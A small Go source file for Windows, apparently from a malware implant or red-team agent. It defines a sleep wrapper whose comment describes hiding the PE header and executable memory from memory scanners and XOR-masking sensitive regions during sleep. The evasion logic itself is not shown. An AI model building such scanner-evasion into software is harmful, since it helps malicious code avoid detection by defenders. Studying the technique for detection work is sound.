//go:build windows

package main

import "time"

// sleepObfuscated sleeps for seconds while hiding the PE header and private
// RWX regions from memory scanners (PAGE_NOACCESS), XOR-obfuscating registered
// sensitive regions, and trimming the process working set.
// Delegates to obfSleepDuration so all protection layers apply uniformly.
func sleepObfuscated(seconds int) {
	if seconds <= 0 {
		return
	}
	obfSleepDuration(time.Duration(seconds) * time.Second)
}
